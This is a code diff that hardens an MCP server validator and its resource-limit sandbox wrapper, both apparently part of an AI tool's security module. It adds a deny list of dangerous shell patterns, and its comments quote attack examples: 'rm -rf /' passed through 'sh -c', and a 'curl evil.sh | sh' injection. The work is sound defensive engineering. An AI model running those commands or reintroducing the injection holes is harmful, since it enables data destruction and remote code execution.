@@ -155,6 +155,33 @@ def verify_environment() -> list[SecurityEvent]:
     return _env_pinner.verify()
 
 
+#: Tokens that have no business in an MCP server's argv.
+#:
+#: ``eval`` and ``exec`` are anchored to match only when the whole argv token
+#: (or its basename) *is* that word. Unanchored substrings rejected any path
+#: that merely contained one — ``execstack``, ``/opt/evaluate/bin/run`` — while
+#: catching nothing an anchored match misses. A plain ``\b`` is not enough
+#: either: ``-`` is a word boundary, so ``\bexec\b`` still rejected
+#: ``/opt/exec-env/bin/server``. Hence an explicit start-or-separator prefix
+#: and an end-or-whitespace lookahead.
+#:
+#: The shell metacharacters are not redundant with the quoting in
+#: :meth:`MCPServerValidator.get_sandbox_wrapper`. Quoting makes them inert;
+#: their presence still means the spec was written expecting shell semantics it
+#: does not get, so the spec is wrong however it is executed.
+_SUSPICIOUS_COMMAND_PATTERNS: tuple[str, ...] = (
+    r"(?:^|[\s/])(?:eval|exec)(?=\s|$)",
+    r"rm\s+-rf",
+    r":/dev/",
+    r">\s*/dev/null",
+    r">&\s*1",
+    r"[;`|]",
+    r"\$\(",
+    r"&&",
+    r"[\r\n]",
+)
+
+
 class MCPServerValidator:
     """Validate and sanitize external MCP server configurations."""
 
@@ -177,15 +204,26 @@ class MCPServerValidator:
         Returns:
             (is_valid, reason) tuple
         """
-        # Strict mode: only approved servers allowed
-        if (
-            security_level == SecurityLevel.STRICT
-            and server_spec.get("name") not in MCPServerValidator.APPROVED_SERVERS
-        ):
-            return (
-                False,
-                f"MCP server '{server_spec.get('name')}' not in approved list (strict mode)",
-            )
+        # Strict mode: only approved servers allowed. The allow-list is the
+        # compiled-in APPROVED_SERVERS plus anything named in
+        # SAKTHAI_APPROVED_MCP, which is what makes strict mode usable at all —
+        # APPROVED_SERVERS ships empty, so without the env surface strict was a
+        # total-denial switch and nothing could opt into it.
+        if security_level == SecurityLevel.STRICT:
+            from ..config import approved_mcp_servers
+
+            name = server_spec.get("name")
+            approved = set(MCPServerValidator.APPROVED_SERVERS) | approved_mcp_servers()
+            if name not in approved:
+                hint = (
+                    "SAKTHAI_APPROVED_MCP is empty, so strict mode allows no servers"
+                    if not approved
+                    else f"approved: {', '.join(sorted(approved))}"
+                )
+                return (
+                    False,
+                    f"MCP server '{name}' not in approved list (strict mode). {hint}",
+                )
 
         # Check command or remote URL
         command = server_spec.get("command", "")
@@ -199,27 +237,25 @@ class MCPServerValidator:
         ):
             return False, "MCP server 'url' must be a valid http or https URL"
 
+        # Validate args before scanning, since the scan covers them.
+        args = server_spec.get("args", [])
+        if not isinstance(args, list):
+            return False, "MCP server 'args' must be a list"
+
         if command:
-            # Block commands that look suspicious
-            suspicious_patterns = [
-                r"eval",
-                r"exec",
-                r"rm\s+-rf",
-                r":/dev/",
-                r">\s*/dev/null",
-                r">&\s*1",
-            ]
-            for pattern in suspicious_patterns:
-                if re.search(pattern, command, re.IGNORECASE):
+            # Scan the command *and its arguments*. Scanning only `command` was
+            # the whole hole: `{"command": "sh", "args": ["-c", "rm -rf /"]}`
+            # has a blameless command and validated clean, while every
+            # dangerous token sat one field over in the part that was never
+            # read. Argument position carries no safety meaning here — what
+            # eventually runs is the whole argv.
+            scanned = " ".join([command, *(str(a) for a in args)])
+            for pattern in _SUSPICIOUS_COMMAND_PATTERNS:
+                if re.search(pattern, scanned, re.IGNORECASE):
                     return (
                         False,
                         f"MCP server command contains suspicious pattern: {pattern}",
                     )
-
-        # Validate args if present
-        args = server_spec.get("args", [])
-        if not isinstance(args, list):
-            return False, "MCP server 'args' must be a list"
 
         return True, "OK"
 
@@ -227,31 +263,58 @@ class MCPServerValidator:
     def get_sandbox_wrapper(
         command: str,
         args: Sequence[str] = (),
-        timeout_sec: int = 30,
+        *,
+        lifetime_sec: int | None = None,
+        cpu_sec: int = 3600,
+        memory_kb: int = 524288,
+        max_fds: int = 256,
     ) -> list[str]:
-        """Generate a sandbox wrapper command for MCP server.
+        """Wrap an MCP server launch in basic resource limits.
 
-        Runs the server with resource limits (CPU, memory, timeout).
+        Returns the argv to execute. Something stronger would use seccomp or
+        AppArmor; this is a floor, not a jail.
+
+        ``lifetime_sec`` caps total wall-clock time and **defaults to no cap**,
+        because an MCP stdio server is long-lived by definition — it must
+        outlive every request made over it. The previous signature took a
+        ``timeout_sec`` that defaulted to 30 and was wired, in
+        ``mcp/manager.py``, to the *per-request read* timeout. So a sandboxed
+        server was wrapped in ``timeout 30`` and killed thirty seconds after
+        launch, however healthy it was: enabling the sandbox broke the server
+        it was protecting. The two durations are unrelated and are now separate
+        parameters. Pass ``lifetime_sec`` only for something genuinely
+        short-lived.
+
+        ``cpu_sec`` is likewise raised from the old hardcoded 60. That was
+        ``ulimit -t``, a CPU-seconds limit, which would terminate any server
+        doing real work on a long session.
+
+        Note that ``ulimit -m`` (``memory_kb``) sets RLIMIT_RSS, which modern
+        Linux kernels do not enforce. It is kept for BSD/macOS, where it does,
+        and because it is harmless where it does not — but do not rely on it as
+        a memory bound on Linux.
 
         Args:
-            command: Original command
-            args: Optional command arguments
-            timeout_sec: Execution timeout in seconds
-
-        Returns:
-            List of command args to execute in sandbox
+            command: The server executable.
+            args: Its arguments.
+            lifetime_sec: Wall-clock cap, or None for none (the default).
+            cpu_sec: ``ulimit -t``, CPU seconds.
+            memory_kb: ``ulimit -m``, resident set size in KB.
+            max_fds: ``ulimit -n``, open file descriptors.
         """
-        # Use timeout + ulimit pattern for basic sandboxing
-        # More robust would use seccomp/AppArmor profiles
-        full_command = f"{command} {shlex.join(list(args))}".strip() if args else command
-        wrapper = [
-            "timeout",
-            str(timeout_sec),
-            "sh",
-            "-c",
-            # Limit memory (512MB), CPU (1 core), file descriptors
-            "ulimit -m 524288 -t 60 -n 256; " + full_command,
-        ]
+        # shlex.join quotes every element. The old form interpolated `command`
+        # raw into the `sh -c` string, so a spec whose command carried a shell
+        # metacharacter — `node; curl evil.sh | sh` — was executed by the
+        # shell. That made turning the sandbox *on* introduce an injection the
+        # unsandboxed path does not have, since it goes through Popen with no
+        # shell at all. Quoting removes the shell's say in what runs; the
+        # metacharacter patterns in `_SUSPICIOUS_COMMAND_PATTERNS` reject such
+        # a spec before it reaches here.
+        full_command = shlex.join([command, *(str(a) for a in args)])
+        limits = f"ulimit -m {int(memory_kb)} -t {int(cpu_sec)} -n {int(max_fds)}"
+        wrapper = ["sh", "-c", f"{limits}; exec {full_command}"]
+        if lifetime_sec is not None:
+            return ["timeout", str(int(lifetime_sec)), *wrapper]
         return wrapper
 
 
@@ -628,7 +691,7 @@ class AuditLogger:
         time. That made the default unreachable by configuration: the test
         suite, which sets ``SAKTHAI_HOME``/``HOME`` per test, still had this
         logger appending to the invoking user's real ``~/.sakthai/audit.log``.
-        An explicitly passed ``log_file`` is honoured as given.
+        An explicitly passed ``log_file`` is honored as given.
         """
         return self._log_file or (sakthai_home() / "audit.log")
 
